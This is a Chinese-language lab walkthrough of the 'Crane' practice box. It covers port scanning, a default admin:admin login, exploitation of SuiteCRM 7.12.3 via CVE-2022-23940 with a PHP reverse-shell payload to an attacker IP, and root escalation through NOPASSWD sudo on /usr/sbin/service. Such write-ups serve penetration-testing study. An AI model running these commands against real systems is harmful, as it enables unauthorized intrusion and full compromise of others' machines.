---
description: Easy - Linux / SuiteCRM 7.12.3 / CVE-2022-23940 / NOPASSWD提权
---

# ✔️ Crane

## 建立立足点

### 信息收集

* 使用Nmap对目标系统的开放端口进行扫描，获取到4个端口：22 / 80 / 3306 / 33060

```bash
nmap -sC -sV -p- -oA crane 192.168.178.146 --open 
```

<figure><img src="../../.gitbook/assets/1 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 检查80端口上的内容，尝试弱口令成功：**admin : admin**

<figure><img src="../../.gitbook/assets/2 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/5 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 并查询到了当前正在运行的程序SuiteCRM的版本号：**v7.12.3**

<figure><img src="../../.gitbook/assets/6 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 查看/robots.txt文件，返现一个名为 **/ical\_server.php** 的php文件，将其下载到本地：

<figure><img src="../../.gitbook/assets/3 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/4 (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 根据当前已知的程序及其版本号**SuiteCRM 7.12.3**，搜索到了公开的已知漏洞可以利用：**CVE-2022-23940**

<figure><img src="../../.gitbook/assets/7 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/8 (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 下载该脚本，并执行：

```bash
python3 exploit.py -h http://192.168.178.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.240\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'" 

nc -lvnp 4444
```

<figure><img src="../../.gitbook/assets/10 (1) (1).png" alt=""><figcaption></figcaption></figure>

### Get Shell

* 成功获取到shell：

<figure><img src="../../.gitbook/assets/9 (1) (1).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 简单手动枚举，发现 **/usr/sbin/service**程序不需要密码即可以root身份运行：

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/11 (1) (1).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 直接利用该程序进行提权：

```bash
sudo /usr/sbin/service ../../../../../bin/bash
```

<figure><img src="../../.gitbook/assets/12 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/13 (2).png" alt=""><figcaption></figcaption></figure>
